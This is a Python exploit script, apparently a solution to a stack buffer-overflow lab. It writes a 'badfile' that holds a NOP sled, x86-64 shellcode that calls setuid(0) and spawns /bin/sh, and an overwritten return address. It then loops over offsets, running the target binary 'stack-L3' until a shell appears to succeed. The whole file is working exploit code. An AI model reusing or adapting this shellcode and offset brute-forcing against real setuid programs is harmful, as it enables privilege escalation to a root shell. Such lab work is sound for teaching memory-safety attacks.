#!/usr/bin/python3
import sys
import os
import subprocess

shellcode = (
    "\x48\x31\xff\x48\x31\xc0\xb0\x69\x0f\x05"
    "\x48\x31\xd2\x52\x48\xb8\x2f\x62\x69\x6e"
    "\x2f\x2f\x73\x68\x50\x48\x89\xe7\x52\x57"
    "\x48\x89\xe6\x48\x31\xc0\xb0\x3b\x0f\x05"
).encode('latin-1')

buffer_addr = 0x7fffffffd880

print("Trying offsets from 200 to 400, incrementing by 4...")
print("="*60)

for offset_val in range(200, 400, 4):
    content = bytearray(0x90 for i in range(517))
    
    # Shellcode at beginning
    start = 0
    content[start:start + len(shellcode)] = shellcode
    
    # Calculate return address
    ret = buffer_addr + offset_val
    
    offset = 216
    L = 8
    content[offset:offset + L] = (ret).to_bytes(L, byteorder='little')
    
    # Write badfile
    with open('badfile', 'wb') as f:
        f.write(content)
    
    print(f"Trying offset {offset_val} (return addr: 0x{ret:016x})...", end=" ")
    
    # Try running stack-L3
    try:
        result = subprocess.run(['./stack-L3'], 
                              timeout=1, 
                              capture_output=True, 
                              text=True)
        if result.returncode == 0:
            print("SUCCESS!")
            print(f"\n🎉 Found working offset: {offset_val}")
            print(f"Return address: 0x{ret:016x}")
            break
        else:
            print("Failed")
    except subprocess.TimeoutExpired:
        print("Timeout (might have worked!)")
        print(f"\n🎉 Possible success at offset: {offset_val}")
        print(f"Return address: 0x{ret:016x}")
        print("Try manually: ./stack-L3")
        break
    except:
        print("Error")

print("="*60)